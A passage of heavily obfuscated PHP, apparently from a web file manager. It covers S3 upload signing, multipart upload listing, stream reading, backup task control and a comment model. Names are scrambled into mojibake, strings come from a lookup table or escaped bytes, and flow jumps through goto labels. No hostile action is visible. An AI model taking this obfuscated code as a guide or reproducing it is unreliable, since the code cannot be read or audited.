$_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; list($aÉ’”Î§”±, $BóÆîË§øØ) = $this->bucketManager->stat($this->bucket, $AôÊ¹¾ï«Œ); if ($aÉ’”Î§”±) { $aÉ’”Î§”±[$EÖ¦ØÁ¥ÖÖ[77]] = intval($aÉ’”Î§”±[$EÖ¦ØÁ¥ÖÖ[1215]]); } return $aÉ’”Î§”±; } protected function _isFolder($F£ Ÿî„ÒÇ) { $eÎÌå¦¿·° =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($F£ Ÿî„ÒÇ == $eÎÌå¦¿·°[33] || $F£ Ÿî„ÒÇ == $eÎÌå¦¿·°[8]) { return !0; } list($A¹•¤ÄíöŠ, $A›±ŠÄ©Å¥) = $this->bucketManager->listFiles($this->bucket, trim($F£ Ÿî„ÒÇ, $eÎÌå¦¿·°[8]) . $eÎÌå¦¿·°[8], $eÎÌå¦¿·°[33], 1, $eÎÌå¦¿·°[8]); return !empty($A¹•¤ÄíöŠ[$eÎÌå¦¿·°[1214]]) || !empty($A¹•¤ÄíöŠ[$eÎÌå¦¿·°[1217]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($B¥®ÒŞŠÎê) { parent::__construct($B¥®ÒŞŠÎê); } public function uploadFormData($FõäÇ˜š¯, $CÚ¶½¢Ô³¿ = 3600) { goto BùêÇèªØ; b¢ÖÀ‚‹«‹: $aø•ÅïÜ¦Â = base64_encode(json_encode($d¢›Ê´»ä±)); $eÓŞËšÛË = hash_hmac($bø„´Ê«‹µ[1143], $e‘–Ê·è›­, $bø„´Ê«‹µ[1144] . $this->secret, !0); $CóÀ¬»Îè¯ = hash_hmac($bø„´Ê«‹µ[1143], $this->region, $eÓŞËšÛË, !0); goto d»µ³å®™§; fàÔÜïª÷: $dŒƒù¶™ƒÖ = $bø„´Ê«‹µ[1135]; $d‚©ùßˆ = $CÚ¶½¢Ô³¿ . $bø„´Ê«‹µ[33]; $b’ÏŞ„ÂïË = $bø„´Ê«‹µ[1097]; goto a¡„›á±›â; BùêÇèªØ: $bø„´Ê«‹µ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F†ƒ»Ü‘Èâ = $bø„´Ê«‹µ[185]; $fã¼íÜ  = $bø„´Ê«‹µ[1133]; goto CùóİåÆß; b¸ôÀŒöº: $f²áï—ïÆ” = array($bø„´Ê«‹µ[199] => $bø„´Ê«‹µ[33], $bø„´Ê«‹µ[1145] => $bø„´Ê«‹µ[33], $bø„´Ê«‹µ[1101] => $F†ƒ»Ü‘Èâ, $bø„´Ê«‹µ[1105] => $b’ÏŞ„ÂïË, $bø„´Ê«‹µ[1109] => $aø•ÅïÜ¦Â, $bø„´Ê«‹µ[1146] => $Bİ“Ü˜ğ–, $bø„´Ê«‹µ[1147] => $fã¼íÜ , $bø„´Ê«‹µ[1148] => $B‘Ü÷ÚšªÒ, $bø„´Ê«‹µ[1149] => $d‚©ùßˆ, $bø„´Ê«‹µ[1150] => $Eô½ÃÄŸ“, $bø„´Ê«‹µ[169] => $this->getHost()); return $f²áï—ïÆ”; goto C¹½¼ŞÂ‡; d»µ³å®™§: $FŸ·¿×â ‡ = hash_hmac($bø„´Ê«‹µ[1143], $F„¼Æñ½ù, $CóÀ¬»Îè¯, !0); $eè®ßˆˆÀ¡ = hash_hmac($bø„´Ê«‹µ[1143], $dŒƒù¶™ƒÖ, $FŸ·¿×â ‡, !0); $Eô½ÃÄŸ“ = hash_hmac($bø„´Ê«‹µ[1143], $aø•ÅïÜ¦Â, $eè®ßˆˆÀ¡); goto b¸ôÀŒöº; CùóİåÆß: $F„¼Æñ½ù = $bø„´Ê«‹µ[59]; $B‘Ü÷ÚšªÒ = gmdate($bø„´Ê«‹µ[1134]); $e‘–Ê·è›­ = gmdate($bø„´Ê«‹µ[684]); goto fàÔÜïª÷; a¡„›á±›â: $DºòÛ´á¥š = array($this->accessKey, $e‘–Ê·è›­, $this->region, $F„¼Æñ½ù, $dŒƒù¶™ƒÖ); $Bİ“Ü˜ğ– = implode($bø„´Ê«‹µ[8], $DºòÛ´á¥š); $d¢›Ê´»ä± = array($bø„´Ê«‹µ[1099] => gmdate($bø„´Ê«‹µ[1098], strtotime($bø„´Ê«‹µ[1136])), $bø„´Ê«‹µ[1100] => array(array($bø„´Ê«‹µ[1102] => $this->bucket), array($bø„´Ê«‹µ[1101] => $F†ƒ»Ü‘Èâ), array($bø„´Ê«‹µ[1103], $bø„´Ê«‹µ[1104], $bø„´Ê«‹µ[33]), array($bø„´Ê«‹µ[1103], $bø„´Ê«‹µ[1137], $bø„´Ê«‹µ[33]), array($bø„´Ê«‹µ[1103], $bø„´Ê«‹µ[1138], $bø„´Ê«‹µ[33]), array($bø„´Ê«‹µ[1105] => $b’ÏŞ„ÂïË), array($bø„´Ê«‹µ[1139] => $Bİ“Ü˜ğ–), array($bø„´Ê«‹µ[1140] => $fã¼íÜ ), array($bø„´Ê«‹µ[1141] => $B‘Ü÷ÚšªÒ), array($bø„´Ê«‹µ[1142] => $d‚©ùßˆ))); goto b¢ÖÀ‚‹«‹; C¹½¼ŞÂ‡: } public function multiUploadFormData($aÎó½½ø«æ, $fø‡‹·‡ = 3600) { $E´‡±éÙ›ò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AÑò…‡ãÜİ = gmdate($E´‡±éÙ›ò[1229]); $FÌà³ë‰Óà = array(); $b¡êé®Ãè÷ = $this->client->getUploadId($this->bucket, $aÎó½½ø«æ, $FÌà³ë‰Óà); if (!$b¡êé®Ãè÷) { return !1; } return array($E´‡±éÙ›ò[209] => $b¡êé®Ãè÷, $E´‡±éÙ›ò[169] => $this->getHost() . $E´‡±éÙ›ò[8] . $this->pathEncode($aÎó½½ø«æ), $E´‡±éÙ›ò[210] => $AÑò…‡ãÜİ, $E´‡±éÙ›ò[89] => $aÎó½½ø«æ); } public function multiUploadAuthData($BŸ²Ù¦¡í³, $cç¬©ìèÚ = array()) { goto fÑˆïË¼¼¹; c‚‰Šï«—: if (isset($cç¬©ìèÚ[$B‰¢±ƒÍ¡[1230]])) { $CîâÒõ’Çé[$B‰¢±ƒÍ¡[1231]] = $cç¬©ìèÚ[$B‰¢±ƒÍ¡[1230]]; } $D¥ç¢İŒ® = explode($B‰¢±ƒÍ¡[171], $this->getHost()); $BÖÛ ÷›µ = array($B‰¢±ƒÍ¡[1232] => $D¥ç¢İŒ®[1], $B‰¢±ƒÍ¡[1233] => $B‰¢±ƒÍ¡[33], $B‰¢±ƒÍ¡[199] => $B‰¢±ƒÍ¡[116], $B‰¢±ƒÍ¡[1145] => $cç¬©ìèÚ[$B‰¢±ƒÍ¡[77]]); goto E³”Š©‚İ; fãÚ†’ˆÏ: if (strpos($E­Ş’õÍ, $B‰¢±ƒÍ¡[213]) === 0) { if (isset($CîâÒõ’Çé[$B‰¢±ƒÍ¡[1231]])) { $aëÅ¿½£í = $CîâÒõ’Çé[$B‰¢±ƒÍ¡[1231]]; } else { if (isset($B¦Ó¼Àİ×à[$B‰¢±ƒÍ¡[1231]])) { $aëÅ¿½£í = $B¦Ó¼Àİ×à[$B‰¢±ƒÍ¡[1231]]; } else { $aëÅ¿½£í = hash($B‰¢±ƒÍ¡[1143], $B‰¢±ƒÍ¡[33]); } } return array($B‰¢±ƒÍ¡[220] => $B¦Ó¼Àİ×à[$B‰¢±ƒÍ¡[220]], $B‰¢±ƒÍ¡[1231] => $aëÅ¿½£í, $B‰¢±ƒÍ¡[210] => $B¦Ó¼Àİ×à[$B‰¢±ƒÍ¡[1234]]); } return $B¦Ó¼Àİ×à[$B‰¢±ƒÍ¡[220]]; goto d‰åÀÎÜå…; fÑˆïË¼¼¹: $B‰¢±ƒÍ¡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E­Ş’õÍ = isset($cç¬©ìèÚ[$B‰¢±ƒÍ¡[160]]) ? $cç¬©ìèÚ[$B‰¢±ƒÍ¡[160]] : $B‰¢±ƒÍ¡[33]; $DŒøöºí‰› = $cç¬©ìèÚ[$B‰¢±ƒÍ¡[89]]; goto FÛñí»ö; E³”Š©‚İ: $DäšÚµÊÒ¿ = $B‰¢±ƒÍ¡[214]; $eÍãÇ›“¢ = $B‰¢±ƒÍ¡[8] . $this->pathEncode($DŒøöºí‰›) . $E­Ş’õÍ; $B¦Ó¼Àİ×à = $this->client->__getSignatureV4($CîâÒõ’Çé, $BÖÛ ÷›µ, $DäšÚµÊÒ¿, $eÍãÇ›“¢); goto fãÚ†’ˆÏ; FÛñí»ö: unset($cç¬©ìèÚ[$B‰¢±ƒÍ¡[89]]); if (isset($cç¬©ìèÚ[$B‰¢±ƒÍ¡[211]])) { return $this->listUploadParts($DŒøöºí‰›, $cç¬©ìèÚ); } $CîâÒõ’Çé = array(); goto c‚‰Šï«—; d‰åÀÎÜå…: } public function listUploadParts($A Ú“òŸË, $F°œ Ë‚„Û = array()) { goto eñšÓ¾È; eñšÓ¾È: $DŠ„æŠ¥ÁĞ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÂ ñŞ‚é¨ = str_replace($DŠ„æŠ¥ÁĞ[221], $DŠ„æŠ¥ÁĞ[33], $F°œ Ë‚„Û[$DŠ„æŠ¥ÁĞ[160]]); $cè‘í˜¹‘  = $this->client->listParts($this->bucket, $A Ú“òŸË, $fÂ ñŞ‚é¨); goto f‡Ù’Ş¶Åâ; b™„Ä––ËÅ: $aÊ×„è‚ƒ = array($DŠ„æŠ¥ÁĞ[1232] => $B—“”šëÌ…[1], $DŠ„æŠ¥ÁĞ[199] => $DŠ„æŠ¥ÁĞ[116], $DŠ„æŠ¥ÁĞ[1145] => strlen($CĞ±¤‡À³–)); $bˆÊæßÉ¾ = $DŠ„æŠ¥ÁĞ[212]; $f¾‘Çµç° = $DŠ„æŠ¥ÁĞ[8] . $this->pathEncode($A Ú“òŸË) . $F°œ Ë‚„Û[$DŠ„æŠ¥ÁĞ[160]]; goto bÓ…ä©º¦ƒ; bÓ…ä©º¦ƒ: $a«øçƒò…À = $this->client->__getSignatureV4($c‡¤í‹‚¾³, $aÊ×„è‚ƒ, $bˆÊæßÉ¾, $f¾‘Çµç°, $CĞ±¤‡À³–); return array($DŠ„æŠ¥ÁĞ[220] => $a«øçƒò…À[$DŠ„æŠ¥ÁĞ[220]], $DŠ„æŠ¥ÁĞ[210] => $a«øçƒò…À[$DŠ„æŠ¥ÁĞ[1234]], $DŠ„æŠ¥ÁĞ[222] => $cè‘í˜¹‘ , $DŠ„æŠ¥ÁĞ[1231] => $a«øçƒò…À[$DŠ„æŠ¥ÁĞ[1231]]); goto aµ«äá±‚; f‡Ù’Ş¶Åâ: if (!$cè‘í˜¹‘ ) { return !1; } $CĞ±¤‡À³– = $DŠ„æŠ¥ÁĞ[1235]; foreach ($cè‘í˜¹‘  as $Dß“šĞÒ) { $CĞ±¤‡À³– .= $DŠ„æŠ¥ÁĞ[1236] . "\74\120\x61\162\164\x4e\165\155\x62\145\162\76{$Dß“šĞÒ[$DŠ„æŠ¥ÁĞ[1187]]}\x3c\x2f\120\141\162\x74\x4e\x75\x6d\x62\x65\162\76\xa" . "\x3c\105\x54\141\x67\76{$Dß“šĞÒ[$DŠ„æŠ¥ÁĞ[1188]]}\74\x2f\105\x54\x61\x67\x3e\xa" . $DŠ„æŠ¥ÁĞ[1237]; } goto cÚÉ¨ñ© †; cÚÉ¨ñ© †: $CĞ±¤‡À³– .= $DŠ„æŠ¥ÁĞ[1238]; $c‡¤í‹‚¾³ = array(); $B—“”šëÌ… = explode($DŠ„æŠ¥ÁĞ[171], $this->getHost()); goto b™„Ä––ËÅ; aµ«äá±‚: } public function link($F‘ğ£§àó—, $a§è”Î˜© = array()) { return parent::link($F‘ğ£§àó—, $a§è”Î˜©); } public function fileOut($dï…ßööÑù, $e• šŸãË = false, $c…‘ŒÈÙÒ´ = false, $c´•»˜ÉÈ’ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1239])) { return parent::fileOutServer($dï…ßööÑù, $e• šŸãË, $c…‘ŒÈÙÒ´, $c´•»˜ÉÈ’); } parent::fileOut($dï…ßööÑù, $e• šŸãË, $c…‘ŒÈÙÒ´, $c´•»˜ÉÈ’); } public function fileOutImage($AÃäÕ¯‹Œ˜, $bËˆÏ›Àª” = 250) { if (strstr($this->endpoint, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1239])) { return parent::fileOutImageServer($AÃäÕ¯‹Œ˜, $bËˆÏ›Àª”); } parent::fileOutImage($AÃäÕ¯‹Œ˜, $bËˆÏ›Àª”); } public function fileOutLink($EàÁ®¸«ÂÂ) { $Aç°±äÄ­ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (substr($EàÁ®¸«ÂÂ, 0, 7) == $Aç°±äÄ­[1112]) { $EàÁ®¸«ÂÂ = $Aç°±äÄ­[1113] . substr($EàÁ®¸«ÂÂ, 7); } header($Aç°±äÄ­[156] . $EàÁ®¸«ÂÂ); die; } public function getHost() { $BÉë¿¦Áå‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dœ•Ò‹øîâ = str_rtrim(parent::getHost(), $BÉë¿¦Áå‡[8] . $this->bucket); $dœ•Ò‹øîâ = explode($BÉë¿¦Áå‡[171], $dœ•Ò‹øîâ); return $dœ•Ò‹øîâ[0] . $BÉë¿¦Áå‡[171] . $this->bucket . $BÉë¿¦Áå‡[91] . $dœ•Ò‹øîâ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($EåÅÃª á†, $Eé‘´¡“¦Ï = 0) { parent::__construct(); $this->source = $EåÅÃª á†; $this->sourceSize = $Eé‘´¡“¦Ï; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($f‘‡À õÙÂ = false) { return $this->sourceSize; } public function getContent($cÚŠŸİ½ø± = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { if ($this->sourceSize <= 0) { return $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][33]; } $D—„Ä½êÁ = ftell($this->source); $c÷ª…²ùŠÈ = @fread($this->source, $this->sourceSize); fseek($this->source, $D—„Ä½êÁ); return $c÷ª…²ùŠÈ; } } public function fileSubstr($Dáè…ŞˆÅ¸ = false, $e¹…¬ÀßˆÊ = 0, $Föè’º¸ïñ = 0) { if (!$Föè’º¸ïñ) { $Föè’º¸ïñ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $e¹…¬ÀßˆÊ, $Föè’º¸ïñ); } if ($this->sourceType == self::TYPE_FILE) { if ($Föè’º¸ïñ <= 0) { return $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][33]; } $F˜™¿²¢ = ftell($this->source); fseek($this->source, $F˜™¿²¢ + $e¹…¬ÀßˆÊ); $Dˆ÷Âë• = @fread($this->source, $Föè’º¸ïñ); fseek($this->source, $F˜™¿²¢); return $Dˆ÷Âë•; } } public function hashMd5($C‘™»ÇŠ„ã = false) { return md5($this->getContent()); } public static function hash($C ÕÊ‹œÄÇ, $a—œ•–ÁÌ = 0) { $Fä®êµªôÖ = new PathDriverStream($C ÕÊ‹œÄÇ, $a—œ•–ÁÌ); return $Fä®êµªôÖ->hashSimple($C ÕÊ‹œÄÇ); } public static function md5($CÔ´ì¤¢Ëê, $C»¼Ñô÷Šä = 0) { $E­Î†½›±‘ = new PathDriverStream($CÔ´ì¤¢Ëê, $C»¼Ñô÷Šä); return $E­Î†½›±‘->hashMd5($CÔ´ì¤¢Ëê); } } goto fâøõÅ±í; Dš¨º³¬: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\x62\141\143\153\165\160\x4c\x69\163\164"; public $field = array("\x69\157", "\156\141\155\x65", "\163\x74\x61\x74\165\163", "\x63\x6f\156\164\145\156\164", "\162\x65\x73\x75\x6c\164", "\164\151\155\x65\106\x72\x6f\155", "\x74\151\155\x65\124\x6f"); public function config() { goto c’ÂœÔÖòŠ; eòõÅ—õ‡: $B©ğÎ¹ğï” = is_array($B©ğÎ¹ğï”) ? $B©ğÎ¹ğï” : array(); if (!isset($B©ğÎ¹ğï”[$fÇ¦–†‘‡[686]])) { $B©ğÎ¹ğï”[$fÇ¦–†‘‡[686]] = $fÇ¦–†‘‡[83]; } $b‰îİ àë = array(); goto CøË¾¡·å; c’ÂœÔÖòŠ: $fÇ¦–†‘‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B©ğÎ¹ğï” = Model($fÇ¦–†‘‡[1085])->get($fÇ¦–†‘‡[715]); $B©ğÎ¹ğï” = json_decode($B©ğÎ¹ğï”, !0); goto eòõÅ—õ‡; D·ß²›Í–É: if (isset($b‰îİ àë[$fÇ¦–†‘‡[190]])) { $b‰îİ àë[$fÇ¦–†‘‡[190]] = json_decode($b‰îİ àë[$fÇ¦–†‘‡[190]], !0); } if (isset($B©ğÎ¹ğï”[$fÇ¦–†‘‡[190]])) { $b‰îİ àë[$fÇ¦–†‘‡[190]][$fÇ¦–†‘‡[1412]] = $B©ğÎ¹ğï”[$fÇ¦–†‘‡[190]]; unset($B©ğÎ¹ğï”[$fÇ¦–†‘‡[190]]); } return array_merge($b‰îİ àë, $B©ğÎ¹ğï”); goto fÀê¸Ñ¡ë¨; CøË¾¡·å: Action($fÇ¦–†‘‡[2131])->taskInit(); $Aó‡«£„òÆ = Model($fÇ¦–†‘‡[2132])->listData(); foreach ($Aó‡«£„òÆ as $EåôËÆ™) { if ($EåôËÆ™[$fÇ¦–†‘‡[1077]] == $fÇ¦–†‘‡[83] && $EåôËÆ™[$fÇ¦–†‘‡[1425]] == $fÇ¦–†‘‡[2133]) { $b‰îİ àë = $EåôËÆ™; break; } } goto D·ß²›Í–É; fÀê¸Ñ¡ë¨: } public function listData($fğïİ“ê– = false, $AÍ……ÒÙÊ’ = "\155\157\144\x69\146\x79\x54\151\x6d\145", $f½ÛÑØñö = false) { return parent::listData($fğïİ“ê–, $AÍ……ÒÙÊ’, !0); } public function lastItem() { $AÆ®¸¨¤ƒ = $this->listData(); return !empty($AÆ®¸¨¤ƒ[0]) ? $AÆ®¸¨¤ƒ[0] : null; } public function kill($bìåÑ ÑÇò) { goto cÌÆš¢ÌÃ±; b¶·ëâÌŒ’: return $this->remove($bìåÑ ÑÇò); goto fÆÏ®Øµ™Ü; aÄ—ÊÊœ: Task::kill($D¹¾ß»‰¹Ù[714]); Task::kill($D¹¾ß»‰¹Ù[730]); Task::kill($D¹¾ß»‰¹Ù[738]); goto d‡º¡æ·âµ; cÌÆš¢ÌÃ±: $D¹¾ß»‰¹Ù =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÒóõÙ·¡ = $this->listData($bìåÑ ÑÇò); if (!$fÒóõÙ·¡ || empty($fÒóõÙ·¡[$D¹¾ß»‰¹Ù[28]])) { return !0; } goto aÄ—ÊÊœ; d‡º¡æ·âµ: $AµÚ‰‚ƒº© = $fÒóõÙ·¡[$D¹¾ß»‰¹Ù[28]]; $EïĞï¢ÈØÕ = TEMP_FILES . $D¹¾ß»‰¹Ù[711] . $AµÚ‰‚ƒº© . $D¹¾ß»‰¹Ù[8]; IO::remove($EïĞï¢ÈØÕ, !1); goto b¶·ëâÌŒ’; fÆÏ®Øµ™Ü: } public function remove($b‰İÌø•) { $B¸ŞĞ¶­Ï = $this->listData($b‰İÌø•); if (!$B¸ŞĞ¶­Ï) { return !0; } return $this->backupRemove($B¸ŞĞ¶­Ï); } private function backupRemove($a…½°Äß’Š) { $bîˆÔ…­¸¾ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; parent::remove($a…½°Äß’Š[$bîˆÔ…­¸¾[367]]); $fÓ¦×‰ñ‰¸ = "\173\x69\x6f\x3a{$a…½°Äß’Š[$bîˆÔ…­¸¾[685]]}\175\x2f\144\x61\x74\x61\x62\x61\163\145\57\142\x61\x63\x6b\165\160\x5f" . $a…½°Äß’Š[$bîˆÔ…­¸¾[28]]; IO::remove($fÓ¦×‰ñ‰¸, !1); return !0; } public function start() { goto E¶¢Èõï­; A‘˜¹šÒôá: if (!$bÍíÜí—ùŒ || $bÍíÜí—ùŒ[$F‚î¼¯»Î [1409]] != $F‚î¼¯»Î [83]) { return !1; } $E÷¦Œ‹êÚ¹ = $this->process(); foreach ($E÷¦Œ‹êÚ¹ as $B³ŞÍ‡‘â¥) { if ($B³ŞÍ‡‘â¥) { return Task::restart($B³ŞÍ‡‘â¥[$F‚î¼¯»Î [367]]); } } goto Fßóğ¯öŠ¯; e‚¼ùí˜‹: return !0; goto d½»³–î‡Á; AØ­ñîğÅ: if (!$fÉ°¥æ¸‚Û->dbFile()) { return !1; } if ($bÍíÜí—ùŒ[$F‚î¼¯»Î [686]] == $F‚î¼¯»Î [470]) { $fÉ°¥æ¸‚Û->file(); } Backup::set(array($F‚î¼¯»Î [683] => 1, $F‚î¼¯»Î [449] => time())); goto e‚¼ùí˜‹; Fßóğ¯öŠ¯: $fÉ°¥æ¸‚Û = new Backup(); $fÉ°¥æ¸‚Û->keep(); if (!$fÉ°¥æ¸‚Û->db()) { return !1; } goto AØ­ñîğÅ; E¶¢Èõï­: $F‚î¼¯»Î  =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($GLOBALS[$F‚î¼¯»Î [6]][$F‚î¼¯»Î [84]][$F‚î¼¯»Î [2134]] != $F‚î¼¯»Î [83]) { return !0; } $bÍíÜí—ùŒ = $this->config(); goto A‘˜¹šÒôá; d½»³–î‡Á: } public function process() { $fßÕâËë¶« =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return array($fßÕâËë¶«[688] => Task::get($fßÕâËë¶«[714]), $fßÕâËë¶«[691] => Task::get($fßÕâËë¶«[730]), $fßÕâËë¶«[167] => Task::get($fßÕâËë¶«[738])); } public function restore() { $bÙ‚Ÿ‡á … =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; ActionCall($bÙ‚Ÿ‡á …[970], !0, 1); ActionCall($bÙ‚Ÿ‡á …[970], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\145\156\x74"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\155\x65" => "\143\157\155\x6d\x65\x6e\164\x5f\155\x65\164\x61", "\155\145\x74\x61\x46\x69\x65\154\144" => "\x63\x6f\155\x6d\x65\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($bÙ†ƒ‡±Ü·) { $dô‘‡ˆù‰Ú =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($bÙ†ƒ‡±Ü·[$dô‘‡ˆù‰Ú[2135]]) { $c…ø‡²»ğØ = $this->where(array($dô‘‡ˆù‰Ú[2136] => $bÙ†ƒ‡±Ü·[$dô‘‡ˆù‰Ú[2135]]))->find(); if (!$c…ø‡²»ğØ || $c…ø‡²»ğØ[$dô‘‡ˆù‰Ú[371]] != $bÙ†ƒ‡±Ü·[$dô‘‡ˆù‰Ú[371]] || $c…ø‡²»ğØ[$dô‘‡ˆù‰Ú[458]] != $bÙ†ƒ‡±Ü·[$dô‘‡ˆù‰Ú[458]]) { return !1; } $this->where(array($dô‘‡ˆù‰Ú[2136] => $bÙ†ƒ‡±Ü·[$dô‘‡ˆù‰Ú[2135]]))->setAdd($dô‘‡ˆù‰Ú[2137], 1); } $bÙ†ƒ‡±Ü·[$dô‘‡ˆù‰Ú[2138]] = 0; $bÙ†ƒ‡±Ü·[$dô‘‡ˆù‰Ú[2137]] = 0; $bÙ†ƒ‡±Ü·[$dô‘‡ˆù‰Ú[683]] = 1; return $this->add($bÙ†ƒ‡±Ü·); } public function remove($D·øò‹ƒŠ ) { $C‰Š‚»Óå‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fò‘òöŸéì = array($C‰Š‚»Óå‘[2136] => $D·øò‹ƒŠ ); $Fõ‹ğÒî¨¨ = $this->where($fò‘òöŸéì)->find(); if ($Fõ‹ğÒî¨¨[$C‰Š‚»Óå‘[2135]]) { $this->where(array($C‰Š‚»Óå‘[2136] => $Fõ‹ğÒî¨¨[$C‰Š‚»Óå‘[2135]]))->setAdd($C‰Š‚»Óå‘[2137], -1); } return $this->where($fò‘òöŸéì)->delete(); } public function edit($EÑ‚Ø‹›„, $CšÕá•šŒ) { $c¯É½â„©¾ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e¯öÔËÔÖ = array($c¯É½â„©¾[2136] => $EÑ‚Ø‹›„); return $this->where($e¯öÔËÔÖ)->save(array($c¯É½â„©¾[2139] => $CšÕá•šŒ)); } public function prasise($C¼ÏÙÀİà³) { $eß‰ÌÂ„ƒæ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Eæ¡¯—ô¤‹ = Model($eß‰ÌÂ„ƒæ[2140]); $E‰è‚­–‚˜ = array($eß‰ÌÂ„ƒæ[2136] => $C¼ÏÙÀİà³, $eß‰ÌÂ„ƒæ[1428] => USER_ID); $bËìÂªš£¿ = $Eæ¡¯—ô¤‹->where($E‰è‚­–‚˜)->find(); if (!$bËìÂªš£¿) { $Eæ¡¯—ô¤‹->add($E‰è‚­–‚˜); $aãÒª³ò‹ = $this->where(array($eß‰ÌÂ„ƒæ[2136] => $C¼ÏÙÀİà³))->setAdd($eß‰ÌÂ„ƒæ[2138], 1); } else { $Eæ¡¯—ô¤‹->where($E‰è‚­–‚˜)->delete(); $aãÒª³ò‹ = $this->where(array($eß‰ÌÂ„ƒæ[2136] => $C¼ÏÙÀİà³))->setAdd($eß‰ÌÂ„ƒæ[2138], -1); } return $aãÒª³ò‹; } public function targetInfo($cä¬‹·ÇÛ¡, $e·‹Ú˜í£ì) { goto d¼§ÏÖùò; d¼§ÏÖùò: $f±ÆĞìÀÜ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aøç¶¤ó÷œ = array($f±ÆĞìÀÜ[523] => $cä¬‹·ÇÛ¡, $f±ÆĞìÀÜ[524] => $e·‹Ú˜í£ì); $D¸Ø„Áª¤ = $this->where($aøç¶¤ó÷œ)->count(); goto E¤ÈÌåÉÏæ; E¤ÈÌåÉÏæ: $EñÁÃ±ãê“ = "\122\x49\x47\110\x54\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x63\157\155\x6d\145\156\x74\137\x70\x72\141\x69\163\145\x20\x73\164\x61\162\40\157\x6e\40\x63\x6f\x6d\155\x65\x6e\164\56\x63\x6f\155\155\x65\x6e\164\x49\x44\40\75\40\163\x74\x61\x72\56\x63\157\155\155\x65\x6e\164\x49\104"; $EÆ¸’¢·í = $this->alias($f±ÆĞìÀÜ[341])->where($aøç¶¤ó÷œ)->join($EñÁÃ±ãê“, $f±ÆĞìÀÜ[2141])->count(); $Dñ½¸¶œäÓ = array($f±ÆĞìÀÜ[2142] => $D¸Ø„Áª¤, $f±ÆĞìÀÜ[2143] => $EÆ¸’¢·í); goto FÒå½•‹©; FÒå½•‹©: return $Dñ½¸¶œäÓ; goto F˜ôà°Áëë; F˜ôà°Áëë: } public function listData($fĞ¾ŒÌŒ–Ğ) { $a¬ĞÛİó¤¡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (isset($fĞ¾ŒÌŒ–Ğ[$a¬ĞÛİó¤¡[2144]])) { if ($fĞ¾ŒÌŒ–Ğ[$a¬ĞÛİó¤¡[2144]]) { $fĞ¾ŒÌŒ–Ğ[$a¬ĞÛİó¤¡[2145]] = array($a¬ĞÛİó¤¡[924], intval($fĞ¾ŒÌŒ–Ğ[$a¬ĞÛİó¤¡[2144]])); } unset($fĞ¾ŒÌŒ–Ğ[$a¬ĞÛİó¤¡[2144]]); } if (isset($fĞ¾ŒÌŒ–Ğ[$a¬ĞÛİó¤¡[2146]])) { if ($fĞ¾ŒÌŒ–Ğ[$a¬ĞÛİó¤¡[2146]]) { $fĞ¾ŒÌŒ–Ğ[$a¬ĞÛİó¤¡[2145]] = array($a¬ĞÛİó¤¡[921], intval($fĞ¾ŒÌŒ–Ğ[$a¬ĞÛİó¤¡[2146]])); } unset($fĞ¾ŒÌŒ–Ğ[$a¬ĞÛİó¤¡[2146]]); } return $this->_listData($fĞ¾ŒÌŒ–Ğ); } private function _listData($f„øó¹Å“¼) { $d·„Š»õ“ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eö¤ğ¹¤ÇÏ = $this->where($f„øó¹Å“¼)->_makeOrder()->selectPage(100); $this->_listAppendParent($eö¤ğ¹¤ÇÏ[$d·„Š»õ“[354]]); $this->_listAppendUser($eö¤ğ¹¤ÇÏ[$d·„Š»õ“[354]]); $this->_listAppendMeta($eö¤ğ¹¤ÇÏ[$d·„Š»õ“[354]]); return $eö¤ğ¹¤ÇÏ; } private function _makeOrder() { $c™˜ÀÒ‹ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d”ÏÌ²ÔÜñ = array($c™˜ÀÒ‹ã[2138], $c™˜ÀÒ‹ã[2137], $c™˜ÀÒ‹ã[187]); $BèƒÆªîŒ¡ = Input::get($c™˜ÀÒ‹ã[407], $c™˜ÀÒ‹ã[7], $c™˜ÀÒ‹ã[389], $d”ÏÌ²ÔÜñ); 